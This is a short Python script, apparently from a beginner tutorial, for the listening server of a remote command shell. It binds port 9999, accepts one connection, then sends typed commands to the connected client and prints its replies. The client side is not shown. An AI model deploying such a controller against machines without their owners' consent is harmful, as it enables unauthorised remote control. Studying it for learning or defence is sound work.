import socket
import sys

# Create socket that allows to connect (Means- just telling that we will be connectin)

def socket_create():
	try:
		global host
		global port
		global s
		host = ''
		port = 9999
		s = socket.socket()
	except socket.error as msg:
		print("Socket Creation Error "+ str(msg));


# Bind socket to port and wait for connection from client (Means- where we will be connecting on a machine)

def socket_bind():
	try:
		global host
		global port
		global s
		print("\nBinding to port: "+str(port)+"...")
		s.bind((host,port))
		s.listen(5) # listen for atmost 5 connections
	except socket.error as msg:
		print("\nSocket binding error "+str(msg)+"\nRetrying...")
		socket_bind()

# Main establish a connection when socket is listening
def socket_accept():
	conn,address= s.accept()
	print("\nConnection has been established |"+"IP "+address[0]+" | PORT:"+ str(address[1]))
	send_commands(conn)
	conn.close()

# Send Commands
def send_commands(conn):
	while True:
		cmd= input()
		if cmd == "quit":
			conn.close()
			s.close()
			sys.exit()
		if len(str.encode(cmd)) > 0:
			conn.send(str.encode(cmd))
			client_response = str(conn.recv(1024), "utf-8")
			print(client_response, end ="") # end="" does not moves a cursor to an ew line


def main():
	socket_create()
	socket_bind()
	socket_accept()

main()







